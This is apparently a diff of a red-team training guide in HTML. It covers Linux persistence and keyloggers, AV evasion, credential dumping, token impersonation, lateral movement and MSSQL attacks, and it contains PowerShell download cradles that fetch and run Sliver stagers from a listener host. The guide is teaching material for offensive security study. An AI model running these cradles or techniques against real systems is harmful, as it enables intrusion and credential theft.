 <h3 id="linux-dotfiles">13.1 User Configuration Files</h3>
-<p>Linux applications store user-specific configuration in "dotfiles" — files prepended with a period — inside the user's home directory. These files are hidden from basic directory listings and are typically writable only by the owning user or root. Modifying them allows an attacker with an existing foothold to trigger code on the next user session.</p>
+<p>Linux applications store user-specific configuration in "dotfiles", files prepended with a period, inside the user's home directory. These files are hidden from basic directory listings and are typically writable only by the owning user or root. Modifying them allows an attacker with an existing foothold to trigger code on the next user session.</p>
 <table class="custom-table">
 <thead><tr><th>File</th><th>Trigger</th><th>Use Case</th></tr></thead>
 <tbody>
@@ -5561,7 +5561,7 @@ Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber</code>
 </ul>
 <h3 id="vim-backdoor">13.2 VIM Config Simple Backdoor</h3>
 <p>VIM's <code>.vimrc</code> configuration file executes VIM scripting commands on startup. Since VIM has access to shell environment variables and can invoke shell commands via the <code>!</code> prefix, it provides a reliable backdoor vector. The <code>:silent</code> command suppresses any debug output that would otherwise alert the user.</p>
-<p>Rather than placing commands directly in <code>.vimrc</code>, a more covert approach sources an external shell script. The VIM plugin directory (<code>~/.vim/plugin/</code>) is even stealthier — any <code>.vim</code> file placed there is automatically loaded on startup without needing a reference in <code>.vimrc</code>.</p>
+<p>Rather than placing commands directly in <code>.vimrc</code>, a more covert approach sources an external shell script. The VIM plugin directory (<code>~/.vim/plugin/</code>) is even stealthier, any <code>.vim</code> file placed there is automatically loaded on startup without needing a reference in <code>.vimrc</code>.</p>
 <table class="custom-table">
 <thead><tr><th>Technique</th><th>VIM Config Syntax</th><th>Notes</th></tr></thead>
 <tbody>
@@ -5608,7 +5608,7 @@ source ~/.bashrc</code></pre>
 </ul>
 <h3 id="vim-keylogger">13.3 VIM Config Keylogger</h3>
 <p>VIM's autocommand feature (<code>:autocmd</code>) binds actions to editor events, enabling a keylogger that works even in restricted VIM environments where shell commands are blocked. The <code>BufWritePost</code> event fires after a buffer is saved, which avoids interfering with the user's save operations while silently capturing file contents.</p>
-<p>Combining autocommands with VIM's environment variable access allows the keylogger to activate conditionally — for example, logging only when VIM runs as root. On distributions where <code>sudo</code> preserves the user's VIM environment (Ubuntu, Red Hat), the plugin will trigger automatically when the user invokes <code>sudo vim</code>.</p>
+<p>Combining autocommands with VIM's environment variable access allows the keylogger to activate conditionally, for example, logging only when VIM runs as root. On distributions where <code>sudo</code> preserves the user's VIM environment (Ubuntu, Red Hat), the plugin will trigger automatically when the user invokes <code>sudo vim</code>.</p>
 <table class="custom-table">
 <thead><tr><th>Autocommand Event</th><th>Trigger Condition</th><th>Attacker Use</th></tr></thead>
 <tbody>
@@ -5644,7 +5644,7 @@ ls -al /tmp/hackedfromvim.txt</code></pre>
 </li>
 </ul>
 <h3 id="linux-av-bypass">13.4 Bypassing AV</h3>
-<p>Linux antivirus solutions are generally less sophisticated than their Windows counterparts. Kaspersky Endpoint Security for Linux uses real-time file scanning and manual scan capabilities via the <code>kesl-control</code> utility. Standard Meterpreter ELF payloads are detected, but wrapping shellcode in a C program is sufficient to evade static analysis.</p>
+<p>Linux antivirus is generally weaker than its Windows counterpart. Kaspersky Endpoint Security for Linux provides real-time file scanning and manual scanning through the <code>kesl-control</code> utility. Standard Meterpreter ELF payloads are detected, but wrapping shellcode in a C program is sufficient to evade static analysis.</p>
 <p>Further obfuscation using XOR encoding of the shellcode buffer eliminates the remaining detections across multi-scanner services. Because the XOR operation is symmetric, the decoder in the wrapper simply applies the same key to reverse the encoding at runtime before executing.</p>
 <table class="custom-table">
 <thead><tr><th>Payload Type</th><th>Kaspersky Detection</th><th>Notes</th></tr></thead>
@@ -5738,7 +5738,7 @@ sudo kesl-control -E --query | grep DetectName</code></pre>
 </li>
 </ul>
 <h3 id="shared-libraries">13.5 Shared Libraries</h3>
-<p>Linux programs are distributed in ELF (Executable and Linkable Format) and share reusable code through shared library (<code>.so</code>) files — the Linux equivalent of Windows DLLs. When an application starts, the dynamic linker resolves library dependencies by searching a fixed sequence of locations. Placing a malicious library earlier in this search order causes the application to load attacker-controlled code instead of the legitimate library.</p>
+<p>Linux programs are distributed in ELF (Executable and Linkable Format) and share reusable code through shared library (<code>.so</code>) files, the Linux equivalent of Windows DLLs. When an application starts, the dynamic linker resolves library dependencies by searching a fixed sequence of locations. Placing a malicious library earlier in this search order causes the application to load attacker-controlled code instead of the legitimate library.</p>
 <table class="custom-table">
 <thead><tr><th>Search Order</th><th>Location</th><th>Notes</th></tr></thead>
 <tbody>
@@ -5837,7 +5837,7 @@ sudo top</code></pre>
 </li>
 </ul>
 <h3 id="ld-preload-exploit">13.7 LD_PRELOAD Exploitation (Function Hooking)</h3>
-<p><code>LD_PRELOAD</code> forces the dynamic linker to load a specified library before all others. Functions defined in the preloaded library override identically-named functions from any library loaded afterward — a technique known as function hooking. Unlike the <code>LD_LIBRARY_PATH</code> approach, this allows intercepting specific function calls while still delegating to the original implementation via <code>dlsym(RTLD_NEXT, ...)</code>.</p>
+<p><code>LD_PRELOAD</code> forces the dynamic linker to load a specified library before all others. Functions defined in the preloaded library override identically-named functions from any library loaded afterward, a technique known as function hooking. Unlike the <code>LD_LIBRARY_PATH</code> approach, this allows intercepting specific function calls while still delegating to the original implementation via <code>dlsym(RTLD_NEXT, ...)</code>.</p>
 <p>Using <code>fork()</code> inside the hooked function allows the payload to execute in a child process while the parent returns the expected value to the calling application, keeping the program functional and avoiding user suspicion. As with <code>LD_LIBRARY_PATH</code>, sudo strips <code>LD_PRELOAD</code> by default, requiring the same alias bypass technique.</p>
 <table class="custom-table">
 <thead><tr><th>Step</th><th>Purpose</th><th>Key Code Element</th></tr></thead>
@@ -6075,11 +6075,11 @@ gcc exploit.c -o exploit
 </ul>
 <h2 id="kiosk-breakouts">14. Kiosk Breakouts</h2>
 
-<p>Interactive kiosks and thin clients run standard operating systems beneath a restrictive interface veneer, making them viable pivot points into back-end corporate networks. The attack methodology focuses on identifying and abusing native functionality — browsers, file dialogs, scripting utilities — rather than importing external tools. This module uses Porteus Kiosk as a Linux case study and closes with Windows-specific escape techniques.</p>
+<p>Kiosks and thin clients are ordinary operating systems hidden behind a locked-down UI. That UI is often the only barrier between the attacker and the back-end corporate network on the other side. The reachable surface is almost never a tool imported onto the box; it is the browser, print dialog, help viewer, or file picker already sitting on the desktop, and one of them is usually exploitable. Porteus Kiosk is the Linux reference target for the coursework. Windows kiosks typically fall to sticky-keys hijacks, task-manager escapes, or a file dialog that permits navigation too far outside its intended scope.</p>
 
 <h3 id="kiosk-enum">14.1 Kiosk Enumeration</h3>
 
-<p>Because specialized tools are unavailable on locked-down kiosk systems, enumeration relies on "living off the land" — misusing built-in system utilities to widen access. Projects like LOLBAS (Windows) and GTFOBins (Linux) catalogue these binaries and are worth consulting throughout the engagement.</p>
+<p>Because specialized tools are unavailable on locked-down kiosk systems, enumeration relies on "living off the land", misusing built-in system utilities to widen access. Projects like LOLBAS (Windows) and GTFOBins (Linux) catalogue these binaries and are worth consulting throughout the engagement.</p>
 
 <p>VNC access simulates physical presence at the kiosk. TigerVNC is preferred for full keyboard shortcut support, enabling the operator to test every available key combination against the restricted environment.</p>
 
@@ -6134,7 +6134,7 @@ mailto:[email]</code></pre>
 
 <h3 id="kiosk-browser-enum">14.2 Kiosk Browser Enumeration</h3>
 
-<p>When browser menus are unavailable, focus shifts to the URL/address bar and URI scheme behavior. The <code>irc://</code> protocol is particularly useful because it is rarely blocked and causes Firefox to present a "Launch Application" dialog — the first crack in the kiosk's defenses.</p>
+<p>When browser menus are unavailable, focus shifts to the URL/address bar and URI scheme behavior. The <code>irc://</code> protocol is particularly useful because it is rarely blocked and causes Firefox to present a "Launch Application" dialog, the first crack in the kiosk's defenses.</p>
 
 <p>The "Launch Application" dialog doubles as a filesystem browser. Navigating to "Other Locations" then "Computer" exposes the full directory tree, enabling enumeration of installed binaries without a terminal emulator.</p>
 
@@ -6186,7 +6186,7 @@ mailto:[email]</code></pre>
 
 <p>The kiosk runs Firefox inside a restricted profile. Firefox can be launched from within itself by using the <code>irc://</code> trigger and selecting <code>/usr/bin/firefox</code> as the handler application, passing a <code>-P "profilename"</code> argument to force the profile manager to open. Creating a fresh profile launches an unrestricted Firefox instance with full menus and developer tools enabled.</p>
 
-<p>The key insight is that Firefox passes the URI as the first command-line argument to any chosen handler. Programs that reject unexpected arguments (like <code>/bin/bash</code>) fail silently, but Firefox itself accepts the URI as a URL and handles it gracefully.</p>
+<p>Firefox passes the URI as the first command-line argument to any chosen handler. Programs that reject unexpected arguments (like <code>/bin/bash</code>) fail silently, but Firefox itself accepts the URI as a URL and handles it gracefully, which turns the browser into a self-hosted execution surface.</p>
 
 <table class="custom-table">
 <thead><tr><th>Firefox Command-Line Option</th><th>Effect</th></tr></thead>
@@ -6228,7 +6228,7 @@ mailto:[email]</code></pre>
 
 <p>With an unrestricted Firefox instance, the <code>file:///</code> URI provides read-only access to the entire filesystem. This enables structured enumeration of users, kernel version, running processes, SSH keys, and writable paths without any external tool.</p>
 
-<p>Firefox's built-in Web Developer tools (accessible from the hamburger menu) extend capabilities further. The Scratchpad tool functions as a JavaScript editor that can also load and save arbitrary plain-text files to the local filesystem.</p>
+<p>Firefox's built-in Web Developer tools (accessible from the hamburger menu) extend capabilities further. The Scratchpad tool is a JavaScript editor that can also load and save arbitrary plain-text files to the local filesystem.</p>
 
 <table class="custom-table">
 <thead><tr><th>File/Path</th><th>Information Gathered</th></tr></thead>
@@ -6275,7 +6275,7 @@ file:///etc/cron.hourly/</code></pre>
 
 <p><code>/usr/bin/gtkdialog</code> builds graphical interfaces from an XML-style markup language and can execute arbitrary shell commands via <code>&lt;action&gt;</code> tags. It accepts a script file with the <code>-f</code> parameter, making it usable with the <code>irc://</code> launch technique when passed as <code>irc://myhost -f /home/[user]/[script]</code>.</p>
 
-<p>The URI argument is absorbed by gtkdialog as an environment variable name — effectively neutralizing the problematic first-argument issue that blocked simpler binaries. Any button action in the markup runs as a shell command under the kiosk user's context.</p>
+<p>The URI argument is absorbed by gtkdialog as an environment variable name, effectively neutralizing the problematic first-argument issue that blocked simpler binaries. Any button action in the markup runs as a shell command under the kiosk user's context.</p>
 
 <table class="custom-table">
 <thead><tr><th>gtkdialog Element</th><th>Purpose</th></tr></thead>
@@ -6664,7 +6664,7 @@ powershell.exe</code></pre>
 
 <h3 id="sam-database">15.1 SAM Database</h3>
 
-<p>Windows stores local user credentials in the Security Account Manager (SAM) database as NTLM password hashes derived from the MD4 algorithm. The SAM is located at <code>C:\Windows\System32\config\SAM</code>, but the SYSTEM process holds an exclusive lock on it — direct copy from a running system fails. The local administrator account (RID 500) is installed on every Windows system, and organizations commonly assign a single shared password to this account across multiple machines, making it a high-value target.</p>
+<p>Windows stores local user credentials in the Security Account Manager (SAM) database as NTLM password hashes derived from the MD4 algorithm. The SAM is located at <code>C:\Windows\System32\config\SAM</code>, but the SYSTEM process holds an exclusive lock on it, direct copy from a running system fails. The local administrator account (RID 500) is installed on every Windows system, and organizations commonly assign a single shared password to this account across multiple machines, making it a high-value target.</p>
 
 <p>Every Windows account is identified by a Security Identifier (SID) in the format <code>S-R-I-S-RID</code>. The RID for the built-in Administrator account is always 500. Two methods exist to extract the SAM offline: creating a Volume Shadow Copy or reading from the registry hives <code>HKLM\sam</code> and <code>HKLM\system</code>. Both methods require the SYSTEM file alongside the SAM because the database is partially encrypted (RC4 or AES depending on Windows version), and the decryption key lives in the SYSTEM hive.</p>
 
@@ -6708,7 +6708,7 @@ python pwdump.py /home/kali/system /home/kali/sam</code></pre>
 
 <h3 id="hardening-local-admin">15.2 Hardening the Local Administrator Account</h3>
 
-<p>Microsoft introduced Group Policy Preferences (GPP) in Windows Server 2008 to manage local administrator passwords centrally. GPP stored passwords in AES-256 encrypted XML files in the SYSVOL share — however, Microsoft published the private AES key on MSDN, breaking the encryption. MS14-025 removed the ability to create new GPP password entries, but existing XML files may still be present in the wild and are recoverable with <code>Get-GPPPassword</code>.</p>
+<p>Microsoft introduced Group Policy Preferences (GPP) in Windows Server 2008 to manage local administrator passwords centrally. GPP stored passwords in AES-256 encrypted XML files in the SYSVOL share, however, Microsoft published the private AES key on MSDN, breaking the encryption. MS14-025 removed the ability to create new GPP password entries, but existing XML files may still be present in the wild and are recoverable with <code>Get-GPPPassword</code>.</p>
 
 <p>LAPS (Local Administrator Password Solution), released in 2015, is the current Microsoft-recommended approach. It stores randomly generated clear-text passwords in two new Active Directory computer object attributes: <code>ms-mcs-AdmPwd</code> (the clear-text password) and <code>ms-mcs-AdmPwdExpirationTime</code>. Read access to <code>ms-mcs-AdmPwd</code> is restricted by group membership and is the primary target for attackers who have compromised a help desk or systems administration account.</p>
 
@@ -6751,7 +6751,7 @@ Get-LAPSComputers</code></pre>
 
 <h3 id="access-token-theory">15.3 Access Token Theory</h3>
 
-<p>Windows creates an access token in the kernel upon user authentication. The token encodes the user's SID, group memberships, integrity level, and enabled privileges. Because tokens reside in kernel memory, they cannot be directly read or modified from user space. Windows defines four integrity levels — Low, Medium, High, and System — with processes at a given level unable to modify processes at a higher level.</p>
+<p>Windows creates an access token in the kernel upon user authentication. The token encodes the user's SID, group memberships, integrity level, and enabled privileges. Because tokens reside in kernel memory, they cannot be directly read or modified from user space. Windows defines four integrity levels, Low, Medium, High, and System, with processes at a given level unable to modify processes at a higher level.</p>
 
 <p>Local administrators receive two tokens at logon: a default medium-integrity token and an elevated high-integrity token. User Account Control (UAC) links these two tokens and presents a consent prompt when elevation is requested. Privileges within the token are governed by two bitmasks: one for present privileges (fixed per logon session) and one for enabled/disabled state (dynamically toggled via <code>AdjustTokenPrivileges</code>).</p>
 
@@ -6820,7 +6820,7 @@ whoami /priv</code></pre>
 </tbody>
 </table>
 
-<p>Alternative tools leveraging the same primitive include RoguePotato (Windows 10 1809+ and Server 2019) and the Beans technique (WinRM-based, Windows clients only). On older systems, Juicy Potato uses COM-based local man-in-the-middle authentication but is blocked on Windows 10 1809+.</p>
+<p>Alternative tools built on the same primitive include RoguePotato (Windows 10 1809+ and Server 2019) and the Beans technique (WinRM-based, Windows clients only). On older systems, Juicy Potato uses COM-based local man-in-the-middle authentication but is blocked on Windows 10 1809+.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -6853,7 +6853,7 @@ sliver ([session]) > migrate -p [pid]</code></pre>
 
 <h3 id="incognito-token-impersonation">15.5 Token Impersonation with Incognito</h3>
 
-<p>Once SYSTEM-level access is obtained, delegation tokens for other authenticated users may be present in memory. These tokens can be impersonated via the Win32 <code>ImpersonateLoggedOnUser</code> API to obtain code execution in the context of another user — including domain administrators — without requiring their credentials or password hashes. This technique avoids writing credentials to disk and may bypass credential-focused detection.</p>
+<p>Once SYSTEM-level access is obtained, delegation tokens for other authenticated users may be present in memory. These tokens can be impersonated via the Win32 <code>ImpersonateLoggedOnUser</code> API to obtain code execution in the context of another user, including domain administrators, without requiring their credentials or password hashes. This technique avoids writing credentials to disk and may bypass credential-focused detection.</p>
 
 <p>In Sliver, the <code>steal-token</code> and <code>SharpImpersonation</code> assembly provide similar capability. Any delegation token for a logged-in user (e.g. an admin who has RDP'd to the target) becomes a pivot to that user's domain context, enabling further lateral movement and authentication to remote resources.</p>
 
@@ -6923,7 +6923,7 @@ nslookup -type=SRV _kerberos._tcp.[domain]</code></pre>
 
 <p>Kerberos authentication requires password hashes to be cached in the LSASS process memory for TGT renewal. Mimikatz, written by Benjamin Delpy, can extract these cached hashes and Kerberos tickets directly from LSASS memory. LSASS runs as SYSTEM, so local administrator access and the <code>SeDebugPrivilege</code> privilege are required. Mimikatz enables <code>SeDebugPrivilege</code> with <code>privilege::debug</code> and calls <code>AdjustTokenPrivileges</code> internally.</p>
 
-<p>The WDigest authentication provider, disabled since Windows 8.1, stores clear-text passwords in LSASS. Setting <code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code> to <code>1</code> re-enables it, causing clear-text credentials to be cached after subsequent logins — useful when NTLM hashes are insufficient.</p>
+<p>The WDigest authentication provider, disabled since Windows 8.1, stores clear-text passwords in LSASS. Setting <code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code> to <code>1</code> re-enables it, causing clear-text credentials to be cached after subsequent logins, useful when NTLM hashes are insufficient.</p>
 
 <table class="custom-table">
 <thead><tr><th>Mimikatz Command</th><th>Purpose</th></tr></thead>
@@ -7181,11 +7181,11 @@ sliver ([session]) > cat C:/Users/Public/local.txt</code></pre>
 
 <h2 id="windows-lateral-movement">16. Windows Lateral Movement</h2>
 
-<p>Windows lateral movement primarily abuses a small set of authenticated protocols — RDP, SMB/DCE-RPC, and WMI — along with NTLM hash or Kerberos ticket reuse. Most techniques require local administrator access on the target. The sections below cover RDP-based movement (GUI, console, hash-passing, reverse proxying, credential theft) followed by a fileless SCM-based variant of PsExec, then Sliver-native lateral movement primitives.</p>
+<p>Windows lateral movement primarily abuses a small set of authenticated protocols, RDP, SMB/DCE-RPC, and WMI, along with NTLM hash or Kerberos ticket reuse. Most techniques require local administrator access on the target. The sections below cover RDP-based movement (GUI, console, hash-passing, reverse proxying, credential theft) followed by a fileless SCM-based variant of PsExec, then Sliver-native lateral movement primitives.</p>
 
 <h3 id="wlm-rdp-standard">16.1 Lateral Movement with RDP</h3>
 
-<p>RDP (Remote Desktop Protocol) is ubiquitous in corporate environments and therefore blends well with normal traffic. Standard RDP requires clear-text credentials. When a session is created, NTLM hashes reside in LSASS memory for its duration — disconnecting without logging out leaves them exposed to credential dumping.</p>
+<p>RDP (Remote Desktop Protocol) is ubiquitous in corporate environments and therefore blends well with normal traffic. Standard RDP requires clear-text credentials. When a session is created, NTLM hashes reside in LSASS memory for its duration, disconnecting without logging out leaves them exposed to credential dumping.</p>
 
 <p>Restricted Admin Mode removes clear-text credential caching by using a network logon instead of an interactive one. It can be enabled or disabled via the <code>DisableRestrictedAdmin</code> registry value. Once enabled, it also permits passing the hash with <code>mstsc.exe /restrictedadmin</code> or <code>xfreerdp /pth:</code>.</p>
 
@@ -7302,7 +7302,7 @@ ssh -N -D 0.0.0.0:1080 localhost</code></pre>
 
 <h3 id="wlm-rdp-console">16.4 RDP as a Console (SharpRDP)</h3>
 
-<p>RDP does not require a GUI client. The terminal services COM library <code>mstscax.dll</code> exposes non-scriptable interfaces that SharpRDP leverages to authenticate and execute commands via <code>SendKeys</code>. This eliminates the need for a graphical session or a reverse tunnel.</p>
+<p>RDP does not require a GUI client. The terminal services COM library <code>mstscax.dll</code> exposes non-scriptable interfaces that SharpRDP invokes to authenticate and execute commands via <code>SendKeys</code>, eliminating the need for a graphical session or a reverse tunnel.</p>
 
 <p>SharpRDP is executed from an already-compromised host with clear-text credentials for the target. It can chain commands using stacked PowerShell calls to download and execute payloads. Within Sliver, SharpRDP is available as an armory alias and can also be invoked through <code>execute-assembly</code>.</p>
 
@@ -7431,7 +7431,7 @@ C:\Tools\Inject.exe</code></pre>
 
 <h3 id="wlm-fileless-scm">16.6 Fileless Lateral Movement via SCM</h3>
 
-<p>Standard PsExec writes a binary to the target disk and creates a new service. A stealthier approach uses the existing Service Control Manager (SCM) DCE/RPC interface to modify the binary path of an existing, non-critical service rather than creating a new one. <code>OpenSCManagerW</code> authenticates using the current thread's access token — no password is needed — which makes pass-the-hash trivial.</p>
+<p>Standard PsExec writes a binary to the target disk and creates a new service. A stealthier approach uses the existing Service Control Manager (SCM) DCE/RPC interface to modify the binary path of an existing, non-critical service rather than creating a new one. <code>OpenSCManagerW</code> authenticates using the current thread's access token, no password is needed, which makes pass-the-hash trivial.</p>
 
 <p>The technique targets a non-critical service like <code>SensorService</code> (present on Windows 10/2016/2019, not auto-started). It changes the service binary to a PowerShell download cradle, starts the service to execute code, and then restores the original binary path. No new service entries or binaries touch disk.</p>
 
@@ -7446,7 +7446,7 @@ C:\Tools\Inject.exe</code></pre>
 </tbody>
 </table>
 
-<p>The complete C# implementation is shown below. It authenticates to the target SCM, opens SensorService, swaps its binary with the payload, and starts the service. Restoring the original binary is not automated in this base POC &mdash; capture the original with <code>QueryServiceConfig</code> beforehand and restore it manually, or use <a href="https://github.com/Mr-Un1k0d3r/SCShell" target="_blank" rel="noopener noreferrer">SCShell</a> which wraps that restore step.</p>
+<p>The complete C# implementation is shown below. It authenticates to the target SCM, opens SensorService, swaps its binary with the payload, and starts the service. Restoring the original binary is not automated in this base POC, capture the original with <code>QueryServiceConfig</code> beforehand and restore it manually, or use <a href="https://github.com/Mr-Un1k0d3r/SCShell" target="_blank" rel="noopener noreferrer">SCShell</a> which wraps that restore step.</p>
 
 <pre><code class="language-csharp">using System;
 using System.Runtime.InteropServices;
@@ -7635,7 +7635,7 @@ sliver ([new-session]) > sa-whoami</code></pre>
 
 <p>WMI (<code>Win32_Process.Create</code>) is a fileless lateral movement vector that does not interact with the SCM or create services. It executes a command in the context of the target user by invoking a WMI method over DCOM. Sliver's <code>jump-wmiexec</code> BOF wraps this capability and executes a command on the remote host using the current session's token.</p>
 
-<p>The typical payload is a base64-encoded PowerShell download cradle that retrieves and executes a Sliver implant. Because WMI process creation is asynchronous, no output is returned — the implant must call back to the listener to confirm execution.</p>
+<p>The typical payload is a base64-encoded PowerShell download cradle that retrieves and executes a Sliver implant. Because WMI process creation is asynchronous, no output is returned, the implant must call back to the listener to confirm execution.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -7784,7 +7784,7 @@ chmod 644 /home/[user]/.ssh/config</code></pre>
 
 <h3 id="linux-ssh-agent-forwarding">17.4 SSH Hijacking via SSH-Agent Forwarding</h3>
 <p>SSH-Agent caches decrypted private keys so users authenticate once and then connect to downstream hosts without re-entering passphrases. When agent forwarding is enabled, key challenges from downstream servers are piped back to the originating machine's agent. An attacker on the intermediate server can either use the forwarded agent context directly (if logged in as the same user) or steal the agent's Unix socket file and impersonate the user with elevated privileges.</p>
-<p>Unlike ControlMaster hijacking, SSH-Agent forwarding hijacking is not limited to already-open connections — any host the victim user's key has access to becomes reachable. The agent socket is stored in <code>/tmp/ssh-*/agent.[pid]</code> and its path is exposed through the process's environment file in <code>/proc/[pid]/environ</code>.</p>
+<p>Unlike ControlMaster hijacking, SSH-Agent forwarding hijacking is not limited to already-open connections, any host the victim user's key has access to becomes reachable. The agent socket is stored in <code>/tmp/ssh-*/agent.[pid]</code> and its path is exposed through the process's environment file in <code>/proc/[pid]/environ</code>.</p>
 
 <table class="custom-table">
 <thead><tr><th>Config Location</th><th>Directive</th><th>Purpose</th></tr></thead>
@@ -7887,7 +7887,7 @@ ansible all -a "id" --become</code></pre>
 
 <h3 id="linux-ansible-playbooks">17.7 Ansible Playbook Exploitation</h3>
 <p>Playbooks are YAML-scripted sequences of tasks run on managed nodes, typically with elevated privileges. Two primary attack vectors exist: harvesting credentials hardcoded in existing playbooks and injecting malicious tasks into world-writable playbooks. When administrators cannot use SSH keys, they often hardcode usernames and passwords directly in playbooks under the <code>ansible_become_pass</code> variable.</p>
-<p>Ansible Vault can encrypt these credentials, but the vault password itself is often weak and crackable with Hashcat (hash mode 16900). The <code>shell</code> Ansible module also leaks its full command line — including embedded credentials — to <code>/var/log/syslog</code> on the managed node unless <code>no_log: true</code> is set in the playbook.</p>
+<p>Ansible Vault can encrypt these credentials, but the vault password itself is often weak and crackable with Hashcat (hash mode 16900). The <code>shell</code> Ansible module also leaks its full command line, including embedded credentials, to <code>/var/log/syslog</code> on the managed node unless <code>no_log: true</code> is set in the playbook.</p>
 
 <table class="custom-table">
 <thead><tr><th>Attack Vector</th><th>Requirement</th><th>Impact</th></tr></thead>
@@ -8216,7 +8216,7 @@ klist</code></pre>
 
 <h2 id="mssql-attacks">18. Microsoft SQL Attacks</h2>
 
-<p>Microsoft SQL Server (MSSQL) is pervasive across enterprise environments and deeply integrated with Active Directory. Because SQL servers frequently run as privileged service accounts and link to one another, a single foothold at the public role can escalate to OS-level code execution on multiple hosts. The attack chain includes AD enumeration, authentication, UNC path injection, hash relay, privilege escalation through impersonation, code execution via stored procedures and custom CLR assemblies, and lateral movement through linked SQL servers — all driven by Sliver C2 tooling.</p>
+<p>Microsoft SQL Server (MSSQL) is pervasive across enterprise environments and deeply integrated with Active Directory. Because SQL servers frequently run as privileged service accounts and link to one another, a single foothold at the public role can escalate to OS-level code execution on multiple hosts. The attack chain includes AD enumeration, authentication, UNC path injection, hash relay, privilege escalation through impersonation, code execution via stored procedures and custom CLR assemblies, and lateral movement through linked SQL servers, all driven by Sliver C2 tooling.</p>
 
 <h3 id="mssql-ad-enumeration">18.1 MSSQL in Active Directory — Enumeration</h3>
 
@@ -8256,7 +8256,7 @@ klist</code></pre>
 
 <h3 id="mssql-authentication">18.2 MSSQL Authentication</h3>
 
-<p>MSSQL authentication operates in two stages: login (SQL Server login or Windows/Kerberos) then mapping to a database user. When Windows Authentication is enabled, any domain user can log in with their Kerberos TGS ticket — no password needed. The login is then mapped to a database user; without an explicit mapping it falls to the built-in <code>guest</code> account with the <code>public</code> role.</p>
+<p>MSSQL authentication operates in two stages: login (SQL Server login or Windows/Kerberos) then mapping to a database user. When Windows Authentication is enabled, any domain user can log in with their Kerberos TGS ticket, no password needed. The login is then mapped to a database user; without an explicit mapping it falls to the built-in <code>guest</code> account with the <code>public</code> role.</p>
 
 <table class="custom-table">
 <thead><tr><th>Login Type</th><th>Mechanism</th><th>Default User Mapping</th><th>Default Role</th></tr></thead>
@@ -8267,7 +8267,7 @@ klist</code></pre>
 </tbody>
 </table>
 
-<p>Even <code>public</code> role access is sufficient to trigger UNC path injection and relay attacks. The C# connection string below uses <code>Integrated Security = True</code>, which passes the current Kerberos token — no credentials required in the binary.</p>
+<p>Even <code>public</code> role access is sufficient to trigger UNC path injection and relay attacks. The C# connection string below uses <code>Integrated Security = True</code>, which passes the current Kerberos token, no credentials required in the binary.</p>
 
 <pre><code class="language-csharp">using System;
 using System.Data.SqlClient;
@@ -8380,7 +8380,7 @@ reader.Close();</code></pre>
 
 <p>A Net-NTLMv2 hash cannot be used directly in a pass-the-hash attack, but it can be relayed to a different host where the same account is a local administrator. SMB signing must be disabled on the relay target (it is disabled by default on all non-domain-controller Windows machines). The attack relays the SQL service account's hash captured from one server to execute commands on a second server.</p>
 
-<p>The key constraint is that you cannot relay back to the origin server on the same protocol (blocked since 2008). Identify a second host where the service account has local admin access — the SPN enumeration output often reveals this. Base64-encode the PowerShell download cradle to avoid quoting issues on the command line.</p>
+<p>The key constraint is that you cannot relay back to the origin server on the same protocol (blocked since 2008). Identify a second host where the service account holds local admin access; the SPN enumeration output usually reveals it. Base64-encode the PowerShell download cradle to avoid quoting issues on the command line.</p>
 
 <pre><code class="language-powershell"># Base64-encode the Sliver stager download cradle (run on Kali with pwsh)
 $text  = "IEX(New-Object Net.WebClient).DownloadString('http://[listener-ip]:[listener-port]/[stager].ps1')"
@@ -8561,7 +8561,7 @@ EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "powershell -enc [base64-cradle]
 
 <h3 id="mssql-custom-assemblies">18.7 Custom CLR Assemblies</h3>
 
-<p>When a database has the <code>TRUSTWORTHY</code> property enabled, the <code>CREATE ASSEMBLY</code> statement can import a managed .NET DLL and expose its methods as stored procedures. This technique provides output back to the caller (unlike <code>sp_OACreate</code>) and leaves no file on disk if the assembly is embedded as a hex string in the SQL statement. CLR Integration is disabled by default and CLR strict security (SQL Server 2017+) restricts unsigned assemblies — both must be configured first.</p>
+<p>When a database has the <code>TRUSTWORTHY</code> property enabled, the <code>CREATE ASSEMBLY</code> statement can import a managed .NET DLL and expose its methods as stored procedures. This technique provides output back to the caller (unlike <code>sp_OACreate</code>) and leaves no file on disk if the assembly is embedded as a hex string in the SQL statement. CLR Integration is disabled by default and CLR strict security (SQL Server 2017+) restricts unsigned assemblies, both must be configured first.</p>
 
 <p>The target database is <code>msdb</code> (TRUSTWORTHY by default). The DLL must be compiled as a Class Library targeting the same .NET Framework version as the SQL server. The <code>[Microsoft.SqlServer.Server.SqlProcedure]</code> attribute marks a method as a stored procedure, and <code>SqlContext.Pipe</code> returns results to the caller.</p>
 
@@ -8662,9 +8662,9 @@ DROP ASSEMBLY myAssembly;</code></pre>
 
 <h3 id="mssql-linked-servers">18.8 Linked SQL Servers — Enumeration and Traversal</h3>
 
-<p>MSSQL supports server-to-server links that forward SQL queries to remote instances. The security context of the link is defined at creation time — an administrator may configure the link to use a fixed <code>sysadmin</code> login, granting elevated privileges to anyone who can query through it. Links are not bidirectional by default, so enumerating all link chains in both directions is critical.</p>
+<p>MSSQL supports server-to-server links that forward SQL queries to remote instances. The security context of the link is defined at creation time, an administrator may configure the link to use a fixed <code>sysadmin</code> login, granting elevated privileges to anyone who can query through it. Links are not bidirectional by default, so enumerating all link chains in both directions is critical.</p>
 
-<p>The <code>linkmap</code> action in MSSQLand produces a tree of reachable servers and the effective login at each hop — this is the fastest way to identify privilege escalation paths through linked servers. SQLRecon can also traverse links with the <code>/l:</code> flag, though it does not support impersonation across link hops.</p>
+<p>The <code>linkmap</code> action in MSSQLand produces a tree of reachable servers and the effective login at each hop. It is the fastest way to identify privilege escalation paths through linked servers. SQLRecon can also traverse links with the <code>/l:</code> flag, though it does not support impersonation across link hops.</p>
 
 <table class="custom-table">
 <thead><tr><th>Query / Action</th><th>Purpose</th></tr></thead>
@@ -8769,7 +8769,7 @@ mssqlpwner [user]:[password]@[sql-server] -link-name [linked-server] exec 'power
 
 <h3 id="mssql-linked-privesc">18.10 Privilege Escalation via Bidirectional Links</h3>
 
